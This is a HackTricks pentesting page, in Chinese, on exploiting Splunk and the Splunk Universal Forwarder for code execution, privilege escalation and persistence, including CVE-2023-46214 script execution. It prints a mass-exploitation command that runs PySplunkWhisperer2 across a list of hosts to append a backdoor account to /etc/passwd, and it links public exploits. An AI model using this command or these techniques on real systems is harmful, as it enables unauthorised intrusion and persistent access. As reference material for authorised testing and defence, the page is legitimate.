# Splunk LPE and Persistence

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

如果在**内部**或**外部**枚举机器时发现**运行着Splunk**（端口8090），如果幸运地知道任何**有效凭据**，您可以**滥用Splunk服务**以**执行shell**作为运行Splunk的用户。如果是root在运行，您可以提升权限到root。

此外，如果您已经是**root且Splunk服务未仅在本地主机上监听**，您可以**从**Splunk服务中**窃取**密码文件并**破解**密码，或**向其中添加新**凭据。并在主机上保持持久性。

在下面的第一张图片中，您可以看到Splunkd网页的外观。



## Splunk Universal Forwarder Agent Exploit Summary

**有关更多详细信息，请查看帖子[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)**

**利用概述:**
针对Splunk Universal Forwarder Agent（UF）的利用允许具有代理密码的攻击者在运行代理的系统上执行任意代码，可能危及整个网络。

**关键要点:**
- UF代理不验证传入连接或代码的真实性，使其容易受到未经授权的代码执行的攻击。
- 常见的密码获取方法包括在网络目录、文件共享或内部文档中查找密码。
- 成功利用可能导致在受损主机上获得SYSTEM或root级别访问权限，数据外泄以及进一步的网络渗透。

**利用执行:**
1. 攻击者获取UF代理密码。
2. 利用Splunk API向代理发送命令或脚本。
3. 可能的操作包括文件提取、用户帐户操作和系统妥协。

**影响:**
- 在每台主机上具有SYSTEM/root级别权限的完整网络妥协。
- 可能禁用日志记录以逃避检测。
- 安装后门或勒索软件。

**利用的示例命令:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**可用的公开利用程序:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## 滥用 Splunk 查询

**有关更多详细信息，请查看帖子 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

**CVE-2023-46214** 允许将任意脚本上传到 **`$SPLUNK_HOME/bin/scripts`**，然后解释了使用搜索查询 **`|runshellscript script_name.sh`** 可以 **执行** 存储在其中的 **脚本**。
